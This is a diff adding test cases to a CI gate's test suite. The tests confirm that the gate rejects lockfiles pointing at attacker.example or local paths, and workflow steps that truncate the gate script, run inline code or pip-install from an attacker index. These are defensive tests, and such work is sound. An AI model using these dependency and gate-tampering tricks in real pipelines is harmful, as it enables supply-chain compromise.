@@ -2895,10 +2895,21 @@ def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contrac
     typed = gate_workflow()
     lock = '{"name":"x","lockfileVersion":3,"packages":{"":{"dependencies":{"lodash":"^4.17.21"}},"node_modules/lodash":{"version":"4.17.21","resolved":"https://%s/lodash-4.17.21.tgz","integrity":"sha512-AAAA"}}}\n'
     r = pr(repo, "chore/bump", {"package-lock.json": lock % "attacker.example"})
-    assert r.returncode == 1 and "public registries only" in r.stdout, r.stdout
+    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
     assert pr(repo, "chore/bump", {"package-lock.json": lock % "registry.npmjs.org"}).returncode == 0
+    for bad in ("HTTPS://attacker.example", "attacker.example"):   # (round seven: the scheme is case-insensitive; a JSON `\/` decodes to `/`)
+        r = pr(repo, "chore/bump", {"package-lock.json": lock % bad})
+        assert r.returncode == 1 and "public registries" in r.stdout, (bad, r.stdout)
+    r = pr(repo, "chore/bump", {"package-lock.json": lock.replace("https://%s/", "https:\\/\\/%s\\/") % "attacker.example"})
+    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
+    for bad in ('"file:../evil"', '"//attacker.example/l.tgz"'):
+        r = pr(repo, "chore/bump", {"package-lock.json": lock.replace('"https://%s/lodash-4.17.21.tgz"', bad).replace("%s", "x")})
+        assert r.returncode == 1 and "public registries" in r.stdout, (bad, r.stdout)
+    r = pr(repo, "chore/bump", {"uv.lock": 'version = 1\n[[package]]\nname = "x"\nversion = "1"\nsource = { editable = "../evil" }\n'})
+    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
+    assert pr(repo, "chore/bump", {"uv.lock": 'version = 1\n[[package]]\nname = "x"\nversion = "1"\nsource = { registry = "https://pypi.org/simple" }\n'}).returncode == 0
     r = pr(repo, "chore/bump", {"poetry.lock": '[[package]]\nname = "x"\n[package.source]\ntype = "url"\nurl = "https://attacker.example/x.whl"\n'})
-    assert r.returncode == 1 and "public registries only" in r.stdout, r.stdout
+    assert r.returncode == 1 and "public registries" in r.stdout, r.stdout
     twin = "name: spec-gate\non:\n  pull_request:\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n"
     cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
     on_base(repo, {CATALOG: cicd_row})
@@ -2939,6 +2950,12 @@ def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contrac
         r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
         assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
     assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          cat scripts/gate/spec_gate.py > \"$RUNNER_TEMP/copy\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    # round seven: `git --output=` truncates the gate; an interpreter fed from stdin runs inline code; pip installs the tree
+    for pre in ("git diff --output=scripts/gate/spec_gate.py HEAD", "git log -1 --output scripts/gate/spec_gate.py", "python3 /dev/stdin <<EOF\n          import os\n          EOF",
+                "python3 -<<EOF\n          import os\n          EOF", "python3 <<EOF\n          import os\n          EOF", "python3 -m pip install .",
+                "python3 -m pip install -e .", "python3 -m pip install --index-url https://attacker.example/simple pyyaml", "pip install -f \"$RUNNER_TEMP\" pyyaml"):
+        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout), (pre, r.stdout)
     meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
     row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | ~~Production~~ | {TODAY} | #42 |").replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: ~~Production~~")
     r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta)
